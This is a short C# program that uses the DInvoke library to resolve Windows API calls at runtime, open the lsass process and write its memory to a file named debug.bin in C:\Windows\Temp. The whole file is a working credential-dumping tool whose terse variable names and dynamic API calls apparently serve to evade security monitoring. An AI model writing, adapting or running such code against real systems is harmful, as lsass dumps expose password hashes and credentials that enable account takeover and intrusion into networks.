using DInvoke.DynamicInvoke;
using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace DiD
{
    class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, SafeFileHandle hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        public static void min(string dF)
        {
            uint tpId = (uint)Process.GetProcessesByName("lsass")[0].Id;
            object[] oPP = { DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION | DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_READ, false, tpId };
            IntPtr tPH = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(Win32.Delegates.OpenProcess), ref oPP);
            FileStream fs = new FileStream(dF, FileMode.Create, FileAccess.ReadWrite, FileShare.Write);
            Generic.GetLibraryAddress("Dbgcore.dll", "MiniDumpWriteDump", true);
            Object[] mA = { tPH, tpId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero };
            string oP = @"C:\Windows\Temp\debug.bin";
            var info = new FileInfo(oP);
            var success = (bool)Generic.DynamicAPIInvoke("dbgcore.dll", "MiniDumpWriteDump", typeof(MiniDumpWriteDump), ref mA);
            if (success)
            {
                Console.WriteLine("All good");
            }
            else
            {
                Console.WriteLine("Error");
            }

        }
        static void Main(string[] args)
        {
            string dL = @"C:\Windows\Temp\debug.bin";
            min(dL);
        }
    }
}
